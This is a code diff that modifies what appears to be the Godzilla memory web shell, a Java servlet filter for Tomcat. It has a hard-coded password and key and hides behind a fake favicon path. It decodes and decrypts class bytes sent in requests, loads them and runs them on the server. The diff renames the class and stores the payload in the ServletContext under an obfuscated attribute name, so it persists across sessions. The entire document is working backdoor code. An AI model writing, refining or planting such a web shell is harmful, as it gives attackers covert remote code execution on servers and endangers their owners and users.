@@ -27,21 +27,23 @@ import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.util.LifecycleBase;
 
-public class GodzillaFilter extends ClassLoader implements Filter {
+public class GodzillaTeZhanFilter extends ClassLoader implements Filter {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
+    private ServletContext servletContext;
+
     String xc = "3c6e0b8a9c15224a";
     public String Pwd = "pass1024";
     public String path = "/favicondemo.ico";
     String md5;
     public String cs;
 
-    public GodzillaFilter() {
+    public GodzillaTeZhanFilter() {
         this.md5 = md5(this.Pwd + this.xc);
         this.cs = "UTF-8";
     }
 
-    public GodzillaFilter(ClassLoader z) {
+    public GodzillaTeZhanFilter(ClassLoader z) {
         super(z);
         this.md5 = md5(this.Pwd + this.xc);
         this.cs = "UTF-8";
@@ -241,6 +243,7 @@ public class GodzillaFilter extends ClassLoader implements Filter {
     }
 
     public void init(FilterConfig filterConfig) throws ServletException {
+        this.servletContext = filterConfig.getServletContext();
     }
 
     public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
@@ -251,14 +254,14 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             HttpSession session = request.getSession();
             byte[] data = base64Decode(req.getParameter(this.Pwd));
             data = this.x(data, false);
-            if (session.getAttribute("payload") == null) {
-                session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
+            if (servletContext.getAttribute("msDwndJjY") == null) {
+                servletContext.setAttribute("msDwndJjY", new GodzillaTeZhanFilter(this.getClass().getClassLoader()).Q(data));
             } else {
-                request.setAttribute("parameters", data);
                 ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                Object f = ((Class)session.getAttribute("payload")).newInstance();
+                Object f = ((Class)servletContext.getAttribute("msDwndJjY")).newInstance();
                 f.equals(arrOut);
                 f.equals(request);
+                f.equals(data);
                 response.getWriter().write(this.md5.substring(0, 16));
                 f.toString();
                 response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
